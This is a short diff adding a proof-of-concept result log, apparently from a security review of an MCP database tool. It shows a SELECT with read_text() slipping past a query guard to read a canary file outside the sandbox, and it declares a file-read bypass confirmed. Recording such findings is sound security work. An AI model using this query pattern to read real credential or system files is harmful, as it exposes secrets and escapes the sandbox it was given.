@@ -1,0 +1,5 @@
+guard verdict on malicious query: PASSED (allowed)
+query: SELECT content FROM read_text('/tmp/claude-1000/-home-sam-Documents-mcp-hunt/dfdecd5b-6694-42f8-bab7-144d6b705121/scratchpad/hive-poc/OUTSIDE_SANDBOX_secret.txt')
+rows returned: [('TOP-SECRET-CANARY: ssh-key-or-/etc/passwd-would-be-here',)]
+
+RESULT: FILE-READ SANDBOX BYPASS CONFIRMED — read a file outside ~/.hive via an allowed SELECT
